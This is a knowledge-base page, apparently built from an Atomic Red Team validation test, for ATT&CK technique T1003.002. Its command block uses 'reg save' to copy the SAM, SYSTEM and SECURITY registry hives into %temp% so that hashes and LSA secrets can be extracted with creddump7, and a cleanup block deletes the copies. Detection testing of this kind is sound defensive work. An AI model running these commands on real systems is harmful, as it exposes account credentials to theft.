---
atomic_guid: "5c2571d0-1572-416d-9676-812e64ca9f44"
title: "Registry dump of SAM, creds, and secrets"
framework: "atomic"
generated: "true"
attack_technique_id: "T1003.002"
attack_technique_name: "OS Credential Dumping: Security Account Manager"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.yaml"
build_date: "2026-04-26 14:38:39"
executor: "command_prompt"
aliases:
  - "5c2571d0-1572-416d-9676-812e64ca9f44"
  - "Registry dump of SAM, creds, and secrets"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Registry dump of SAM, creds, and secrets

Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated
via three registry keys. Then processed locally using https://github.com/Neohapsis/creddump7

Upon successful execution of this test, you will find three files named, sam, system and security in the %temp% directory.

## Metadata

- Atomic GUID: 5c2571d0-1572-416d-9676-812e64ca9f44
- Technique: T1003.002: OS Credential Dumping: Security Account Manager
- Platforms: windows
- Executor: command_prompt
- Elevation Required: True
- Source Path: atomics/T1003.002/T1003.002.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1003-os_credential_dumping|T1003.002]]

## Executor

- elevation_required: True
- name: command_prompt

### Command

```commandprompt
reg save HKLM\sam %temp%\sam
reg save HKLM\system %temp%\system
reg save HKLM\security %temp%\security
```

### Cleanup

```commandprompt
del %temp%\sam >nul 2> nul
del %temp%\system >nul 2> nul
del %temp%\security >nul 2> nul
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.yaml)
